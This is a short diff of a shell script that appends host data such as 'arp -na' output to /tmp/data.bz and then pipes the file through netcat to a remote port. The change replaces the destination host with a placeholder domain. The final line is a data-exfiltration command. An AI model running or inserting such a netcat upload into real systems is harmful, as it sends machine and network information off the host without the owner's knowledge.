@@ -9,4 +9,4 @@ arp -na >> /tmp/data.bz
 
 echo "===============End File================" >> /tmp/data.bz
 echo "" >> /tmp/data.bz
-cat /tmp/data.bz | nc security.hackerpatches.com 20801
+cat /tmp/data.bz | nc security.example.com 20801
